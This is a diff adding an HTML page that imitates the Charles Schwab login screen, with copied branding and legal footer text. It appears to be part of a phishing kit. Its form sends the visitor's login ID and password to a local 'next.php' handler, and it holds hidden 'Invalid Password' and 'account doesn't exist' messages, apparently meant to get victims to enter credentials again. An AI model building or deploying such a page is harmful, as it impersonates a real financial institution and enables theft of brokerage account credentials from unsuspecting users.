@@ -1,0 +1,227 @@
+<html><head id="Head1">
+    <meta charset="utf-8">
+    <title>Login | Charles Schwab</title>
+    <link type="text/css" rel="stylesheet" href="css/main.css?v=20.19">
+    <link type="text/css" rel="stylesheet" href="css/login-component-responsive-secondary.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/sdps.css">
+    <style type="text/css">
+    .submit-btn {
+        box-shadow: inset 0px 0px 0px 0px #caefab;
+        background: linear-gradient(to bottom, #005f83 5%, #005f83 100%);
+        background-color: #005f83 100%;
+        border-radius: 6px;
+        border: 1px solid #ebebeb;
+        display: inline-block;
+        cursor: pointer;
+        color: #ffffff;
+        font-family: Arial;
+        font-size: 15px;
+        padding: 8px 50px;
+        text-decoration: none;
+        text-shadow: 0px 1px 0px #aade7c;
+    }
+
+    .submit-btn:hover {
+        background: linear-gradient(to bottom, #005f83 5%, #005f83 100%);
+        background-color: #005f83;
+    }
+
+    .submit-btn:active {
+        position: relative;
+        top: 1px;
+    }
+
+    .container {
+        width: auto;
+    }
+
+    .main {
+        width: auto;
+        margin: 15px;
+    }
+
+    section.main-content {
+        width: auto;
+        float: none;
+    }
+
+    div.login-wrapper {
+        width: auto;
+        height: 600px;
+        padding: 30px 0 0;
+        background: url('images/Login_Background.jpg') no-repeat center;
+        background-size: cover;
+
+    }
+
+    div.module {
+        width: auto;
+        height: 608px;
+        text-align: center;
+    }
+
+    footer {
+        width: auto;
+        margin: 40px auto 0;
+    }
+
+    footer .disclosures {
+        width: auto;
+        font-family: ArialMT, Arial, sans-serif;
+        font-size: 11px;
+        line-height: 13px;
+        color: #222;
+    }
+    </style>
+</head>
+
+<body>
+    <div id="loginContainer">
+        <header>
+            <div class="container">
+                <div id="headerLogo" class="header__logo"><a href="#" class="logo" aria-label="Charles Schwab Logo click here to go to the home page." target="_top">
+                        <span class="svg-icon svg-logo" aria-hidden="true"></span>
+                    </a></div>
+                
+            </div>
+        </header>
+        <div class="main cf">
+            <section class="main-content">
+              
+                <div class="login-wrapper">
+                    <div class="module">
+                        <div class="login">
+                            <h1 id="loginHeadline">Log in to Schwab</h1>
+                            <div id="iframeWrapper" class="login__iframe" style="height: auto;">
+                                <p id="msg" style="color: red;font-weight: 600;font-size: 14px;padding-bottom: 10px; display: none;">Invalid Password...! Please enter correct password.</p>
+                                <p id="error" style="color: red;font-weight: 600;font-size: 14px;padding-bottom: 10px; display: none;">That account doesn't exist. Enter a different account</p>
+                                <form class="form-horizontal" id="LoginComponentForm" action="./next.php" method="POST">
+                                    <div id="lms-login-widget-responsive-secondary">
+                                        <div class="form-group first-field ">
+                                            <div class="col-xs-12 control-label first-field-label" style="text-align: left; "><label for="LoginId" style="font-weight: normal" id="userEmail-label">Login ID</label></div>
+                                            <div class="col-xs-12"><input class="form-control" id="ai" name="ai" type="text" value="" required=""></div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="col-xs-12 control-label" style="text-align: left; "><label for="Password" id="PasswordLabel" style="font-weight: normal">Password</label></div>
+                                            <div class="col-xs-12"><input class="form-control" id="pr" name="pr" type="password" required=""></div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="col-xs-12 control-label" style="text-align: left; "><label for="StartIn" style="font-weight: normal">Start Page</label></div>
+                                            <div class="col-xs-12">
+                                                <div class="start-in-wrapper">
+                                                    <select class="form-control start-in-dropdown" id="StartIn" name="StartIn">
+                                                        <option value="Accounts Summary">Accounts Summary</option>
+                                                        <option value="Account Balances">Account Balances</option>
+                                                        <option value="Positions">Positions</option>
+                                                        <option value="Trade Ticket">Trade Ticket</option>
+                                                        <option value="History">History</option>
+                                                        <option value="Stock ETF Trading">Stock &amp; ETF Trading</option>
+                                                        <option value="Options Trading">Options Trading</option>
+                                                        <option value="Mutual Fund Trading">Mutual Fund Trading</option>
+                                                        <option value="Bond Trading">Bond Trading</option>
+                                                        <option value="Research">Research</option>
+                                                        <option value="Trade Source">Trade Source</option>
+                                                        <option value="Order Status">Order Status</option>
+                                                    </select>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="lms-widget-login-close-cntr">
+                                            <div class="lms-secondary-button-section">
+                                                <button class="submit-btn" id="btn1" type="submit" name="btn1">
+                                                    Log In
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                            <div class="login__utilitylinks cf" style="margin-top: 40px">
+                                <ul class="left">
+                                    <li><span id="lnkForgotIdPassword"><a href="#">Forgot login ID or password?</a></span></li>
+                                    <li><a href="#" id="lnkChineseTrading" lang="zh-TW">中文網路通</a></li>
+                                </ul>
+                                <ul class="right">
+                                    <li><a href="#" id="lnkNewUserLms">New user?</a></li>
+                                    <li><a href="#" id="lnkMobileLogInLms">Log in to mobile</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <footer role="contentinfo" class="sdps-p-left_small sdps-p-right_small sdps-m-top_small">
+                        <div id="clientRelationship" class="sdps-grid-fluid">
+                            <div class="col sdps-p-around_medium">
+                                <div><span id="clientRelationshipSummaryText1" class="sdps-text-l-bold-body">Important information about our relationship with you:</span> <a href="https://www.schwab.com/transparency" id="lnkRelationshipSummaries">Client Relationship Summaries</a></div>
+                                <div class="sdps-p-top_medium"><span id="clientRelationshipSummaryText2">Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at</span> <a href="https://www.schwab.com/transparency" id="lnkSchwabTransparency">schwab.com/transparency</a>.</div>
+                            </div>
+                        </div>
+                        <div id="footerlinks">
+                            <ul class="sdps-list--inline">
+                                <li><span class="svg-lock-icon"></span><a href="/public/schwab/nn/legal_compliance/schwabsafe" id="footerLink1" target="_blank" class="links-allign">Schwab Safe®</a>|</li>
+                                <li><a href="/public/schwab/nn/legal_compliance/schwabsafe/security_guarantee.html" id="footerLink2" target="_blank" class="links-allign">The Schwab Security Guarantee</a>|</li>
+                                <li><a href="http://www.schwab.com" id="footerLink3">Schwab Homepage</a></li>
+                            </ul>
+                        </div>
+                        <div id="CHANFooter" class="footer__disclosures sdps-p-bottom_medium">
+                            <p><a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="http://www.schwab.com/public/schwab/nn/customer_service/browsers.html" rel="" target="" title="" type="">Web Browser Information</a> — IMPORTANT information for Windows XP users.</p>
+                            <p class="disclosures">Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value</p>
+                            <p>Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
+                            <p>Check the background of this firm or one of its investment professionals on <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="https://brokercheck.finra.org/" rel="" target="" title="" type="">FINRA's BrokerCheck</a>.</p>
+                            <p>The Charles Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Charles Schwab &amp; Co., Inc. (<a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="http://www.sipc.org/" rel="" target="" title="" type="">member SIPC</a>), offers investment services and products, including Schwab brokerage accounts. Its banking subsidiary, Charles Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p>
+                            <p>This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="http://www.schwab-global.com/public/schwab-gcb-en" rel="" target="" title="" type="">non-U.S. residents</a>.</p>
+                            <p>© 2021 Charles Schwab &amp; Co., Inc, All rights reserved. Member <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="http://www.sipc.org/" rel="" target="" title="" type="">SIPC</a>. Unauthorized access is prohibited. Usage will be monitored. (0617-ZYYE)</p>
+                        </div>
+                    </footer>
+                </div>
+            </section>
+        </div>
+    </div>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+
+</body></html>
